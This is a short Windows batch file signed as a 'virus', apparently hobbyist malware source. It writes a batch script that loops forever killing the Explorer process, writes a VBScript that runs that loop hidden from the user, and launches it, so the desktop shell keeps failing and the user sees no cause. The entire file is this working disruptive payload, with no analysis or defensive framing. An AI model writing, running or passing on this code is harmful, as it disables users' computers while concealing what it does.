@ echo off

rem ---------------------------------
rem Kill Explorer
echo :a >>explorer.bat
echo tskill explorer >>explorer.bat
echo goto a >>explorer.bat
echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs
echo strCommand = "explorer.bat">>invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs
start "" invisi.vbs
rem ---------------------------------


__-Virus Author: subhojit-__